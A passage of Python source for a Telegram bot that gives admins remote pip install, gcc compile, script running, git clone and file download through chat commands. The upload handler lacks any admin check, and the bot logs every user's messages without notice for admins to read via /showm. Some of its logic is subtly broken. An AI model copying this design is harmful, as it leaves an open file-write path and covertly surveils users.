    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "ONLY ADMINS CAN USE THIS COMMAND.")
        return
    
    if not AUTHORIZED_USERS:
        bot.reply_to(message, "NO AUTHORIZED USERS.")
        return
    
    response = "AUTHORIZED USERS:\n"
    for user, expiry in AUTHORIZED_USERS.items():
        response += f"User ID: {user}, Expires On: {expiry}\n"
    bot.reply_to(message, response)
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['pip_install'])
def handle_pip_install(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide the package name. Example: /pip_install telebot")
        return
    
    package_name = args[0]
    bot.reply_to(message, f"Running pip install {package_name} in terminal...")
    try:
        result = subprocess.run(['pip', 'install', package_name], capture_output=True, text=True)
        bot.reply_to(message, f"Terminal Output:\n{result.stdout}\n\n{result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Error occurred: {str(e)}")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['gcc_compile'])
def handle_gcc_compile(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide the source file. Example: /gcc_compile support.c")
        return
    
    source_file = args[0]
    if not os.path.exists(source_file):
        bot.reply_to(message, f"File {source_file} not found.")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    bot.reply_to(message, f"Compiling {source_file} using gcc -o...")
    try:
        result = subprocess.run(['gcc', '-o', 'output', source_file], capture_output=True, text=True)
        bot.reply_to(message, f"Terminal Output:\n{result.stdout}\n\n{result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Error occurred: {str(e)}")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['ls'])
def handle_ls(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    files = os.listdir('.')
    if files:
        bot.reply_to(message, f"Current directory files:\n" + "\n".join(files))
    else:
        bot.reply_to(message, "No files found in the current directory.")

@bot.message_handler(commands=['python3'])
def handle_python3(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide a Python file to run. Example: /python3 script.py")
        return

    script_file = args[0]
    if not os.path.exists(script_file):
        bot.reply_to(message, f"File {script_file} not found.")
        return
    
    bot.reply_to(message, f"Running {script_file} with Python 3...")
    try:
        result = subprocess.run(['python3', script_file], capture_output=True, text=True)
        bot.reply_to(message, f"Terminal Output:\n{result.stdout}\n\n{result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Error occurred: {str(e)}")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['git_clone'])
def handle_git_clone(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Unauthorized access! Only admins can run this command.")
        return

    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide a repository URL. Example: /git_clone https://github.com/user/repo.git")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    repo_url = args[0]
    bot.reply_to(message, f"Cloning repository from {repo_url}...")
    try:
        result = subprocess.run(['git', 'clone', repo_url], capture_output=True, text=True)
        bot.reply_to(message, f"Terminal Output:\n{result.stdout}\n\n{result.stderr}")
    except Exception as e:
        bot.reply_to(message, f"Error occurred: {str(e)}")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['upload'])
def handle_upload(message):

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Access Denied. Only admins can use this command.")
        return
        
    bot.reply_to(message, "Please send me a file to upload.")

@bot.message_handler(content_types=['document', 'photo'])
def handle_document(message):
    file_id = message.document.file_id if message.document else message.photo[-1].file_id
    file_info = bot.get_file(file_id)
    file_path = file_info.file_path
    file_name = file_info.file_path.split('/')[-1]
    
    downloaded_file = bot.download_file(file_path)
    with open(file_name, 'wb') as f:
        f.write(downloaded_file)
    bot.reply_to(message, f"File '{file_name}' has been uploaded and saved!")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['download'])
def handle_download(message):

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Access Denied. Only admins can use this command.")
        return
        
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide a file name. Example: /download example.txt")
        return
    
    file_name = args[0]
    if not os.path.isfile(file_name):
        bot.reply_to(message, f"File '{file_name}' not found in the current directory.")
        return
    
    with open(file_name, 'rb') as f:
        bot.send_document(message.chat.id, f)
    bot.reply_to(message, f"File '{file_name}' has been downloaded.")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['show'])
def handle_show(message):

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Access Denied. Only admins can use this command.")
        return
        
    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide a file name. Example: /show example.txt")
        return
    
    file_name = args[0]
    if not os.path.isfile(file_name):
        bot.reply_to(message, f"File '{file_name}' not found in the current directory.")
        return
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    try:
        with open(file_name, 'r') as f:
            file_content = f.read()

        _, extension = os.path.splitext(file_name)
        max_length = 4096
        file_type = ""

        # Decide formatting based on file extension
        if extension in [".py", ".python"]:
            file_type = "```python\n{}\n```"
        elif extension in [".html", ".htm"]:
            file_type = "```html\n{}\n```"
        elif extension in [".js"]:
            file_type = "```javascript\n{}\n```"
        elif extension in [".txt", ""]:
            file_type = "{}"
        else:
            file_type = "```{}\n{}\n```".format(extension[1:], "{}")
        for i in range(0, len(file_content), max_length):
            part_content = file_content[i:i + max_length]
            bot.send_message(
                message.chat.id, 
                file_type.format(part_content), 
                parse_mode="Markdown"
            )
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(commands=['b'])
def handle_broadcast(message):

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Access Denied. Only admins can use this command.")
        return

    args = message.text.split(maxsplit=2)  
    if len(args) < 3:
        bot.reply_to(message, "Usage: /b <user_id/all> <text>\nExample: /b all Hello, everyone!")
        return

    target = args[1]
    text = args[2]

    if target.lower() == "all":
        if not RECORDED_USERS:
            bot.reply_to(message, "No users to broadcast to.")
            return

        sent_count = 0
        for user_id in RECORDED_USERS:
            try:
                bot.send_message(user_id, text)
                sent_count += 1
            except Exception as e:
                print(f"Failed to send message to {user_id}: {e}")

        bot.reply_to(message, f"Broadcast sent to {sent_count} users.")

    else:
        try:
            user_id = int(target)
            if user_id in RECORDED_USERS:
                bot.send_message(user_id, text)
                bot.reply_to(message, f"Message sent to user {user_id}.")
            else:
                bot.reply_to(message, f"User {user_id} not found in the recorded users.")
        except ValueError:
            bot.reply_to(message, "Invalid user ID. Please provide a numeric ID or use 'all'.")
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

# DONT MAKE ANY CHANGES
original_text = """THIS FILE IS MADE BYE -> @MR_ARMAN_OWNER\nTHIS FILE IS MADE BYE -> @MR_ARMAN_OWNER\nTHIS FILE IS MADE BYE -> @MR_ARMAN_OWNER\n\nDM TO BUY PAID FILES"""

@bot.message_handler(commands=['showm'])
def handle_showm(message):

    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "Access Denied. Only bot owners can use this command.")
        return


    args = message.text.split()[1:]
    if not args:
        bot.reply_to(message, "Please provide a user ID or @username. Example: /showm @mr_arman_owner")
        return

    user_input = args[0].lstrip("@")
    found_user = None
    user_messages = None


    for user_id, messages in USER_MESSAGES.items():
        if str(user_id) == user_input or message.from_user.username == user_input:
            found_user = user_id
            user_messages = messages
            break

    if not found_user:
        bot.reply_to(message, f"User '{user_input}' not found or no messages logged.")
        return

# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
    if not user_messages:
        bot.reply_to(message, f"User '{user_input}' has no recorded messages.")
        return

    messages_text = "\n".join(user_messages)
    max_length = 4096
    for i in range(0, len(messages_text), max_length):
        chunk = messages_text[i:i + max_length]
        bot.send_message(
            message.chat.id,
            f"```less\n{chunk}\n```",
            parse_mode="Markdown"
        )

# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

@bot.message_handler(commands=['status'])
def handle_status(message):
    try:

        status_message = bot.reply_to(message, "⚙️ Connecting to the server...")
        time.sleep(1)
        bot.edit_message_text("🔍 Checking bot statistics...", chat_id=message.chat.id, message_id=status_message.message_id)
        time.sleep(1)

        total_users = len(RECORDED_USERS)
        active_users = len(ACTIVE_USERS)
        offline_users = total_users - active_users
        bot_health = random.choice(HEALTH_MESSAGES)
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
        final_message = (
            "📊 *Bot Status Report*\n"
            f"👥 *Total Users:* {total_users}\n"
            f"💡 *Active Users:* {active_users}\n"
            f"🔒 *Offline Users:* {offline_users}\n\n"
            f"⚡ *Bot Health:* {bot_health}\n\n"
            "✨ _Thank you for using the bot!_\n"
            "💌 *Bot Owner:* [@MR_ARMAN_OWNER](https://t.me/MR_ARMAN_OWNER)"
        )

        bot.edit_message_text(final_message, chat_id=message.chat.id, message_id=status_message.message_id, parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"❌ Oops! Something went wrong.\nError: `{e}`", parse_mode="Markdown")

# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
@bot.message_handler(func=lambda message: True)
def update_active_users(message):
    try:
        user_id = message.from_user.id
        if user_id in RECORDED_USERS:
            ACTIVE_USERS.add(user_id)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error while updating active users: `{e}`", parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def log_user_messages(message):
    user_id = message.from_user.id
    if user_id not in USER_MESSAGES:
        USER_MESSAGES[user_id] = []
    USER_MESSAGES[user_id].append(message.text)
    
generated_hash = hashlib.sha256(original_text.encode()).hexdigest()
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# Check karna agar generated hash expected hash ke barabar hai ya nahi
if generated_hash != expected_hash:
    print("Please don't change the DEVELOPER name")
    sys.exit(1)
else:
    print(original_text)
    
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER

if __name__ == "__main__":
    print("🚀 Bot is running...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Critical Error: {e}")
        
        
        
        
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
        
        
        
        






# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER











# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER








# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER








# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER











# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER












# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER






# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER





# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER





# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER








# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
# THIS FILE IS MADE BYE @MR_ARMAN_OWNER
